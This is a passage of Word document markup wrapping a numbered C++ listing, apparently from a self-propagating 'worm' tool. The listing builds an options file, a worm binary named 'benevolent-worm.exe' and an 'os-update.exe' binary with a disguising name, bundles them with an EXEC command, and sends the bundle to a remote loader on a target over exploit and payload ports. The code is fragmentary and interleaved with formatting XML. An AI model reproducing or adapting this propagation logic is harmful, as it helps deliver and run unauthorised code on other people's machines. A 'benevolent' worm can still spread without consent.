      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploitPayloadBytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploitPayloadBytes_length</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45                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Failed to send remote loader payload to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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_PORT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46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47         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 48         </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 49         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Construct the options file content</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 50         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Construct options file</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 51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makeSafeFilename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WormOptions</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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getCurrentTimestamp</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52         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Constructing options file with name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53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optionsContent_vector</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createOptionsFileContent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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>EXPLOIT_PORT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54         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Options file (with SAVE) has length of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optionsContent_vector.size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55         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 56         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 57         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Worm binary</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 58         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Constructing worm binary SAVE using "</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> + Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormBinaryFullPathname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59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wormContent</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prepForSaveBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormBinaryFullPathname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"benevolent-worm.exe"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60         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Worm binary executable (with SAVE) has length of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wormContent.size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61 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 62         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Update binary</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 63         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">"Constructing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> update binary SAVE using "</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> + Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>updateBinaryFullPathname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64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updateContent</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prepForSaveBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>updateBinaryFullPathname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"os-update.exe"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65         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Update binary executable (with SAVE) has length of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updateContent.size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66 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 67         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// EXEC command</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 68         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Construction EXEC command"</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69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execContent</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createExecContent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"benevolent-worm.exe"</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"os-update.exe"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70         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 71         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Bundle up all the SAVE file commands and the EXEC commands into one big array for sending</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 72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wormPayload</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73         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormPayload.insert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wormPayload.end</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optionsContent_vector.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(), optionsContent_vector.end());</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 74         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormPayload.insert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wormPayload.end</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wormContent.begin</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wormContent.end</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75         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormPayload.insert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wormPayload.end</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updateContent.begin</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updateContent.end</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76         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormPayload.insert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wormPayload.end</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execContent.begin</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execContent.end</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77         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 78         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 79         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Send the data</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 80         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// could also have done &amp;(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>var.front</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>())  or &amp;vector[0]</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 81         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// BE WARNED THAT IF DATA IS CHANGED IN THE VECTOR THEN THIS POINTER COULD BECOME INVALIDATED</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 82         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//      (hence why we use const to help reduce the chance of this accidental mistake)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 83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wormPayload_bytes</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wormPayload.data</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[C++0x STL]</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 84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wormPayload_bytes_length</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wormPayload.size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85         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 86         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 87         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Sending worm code to remote loader for SAVE and EXEC"</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88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sendToTarget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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
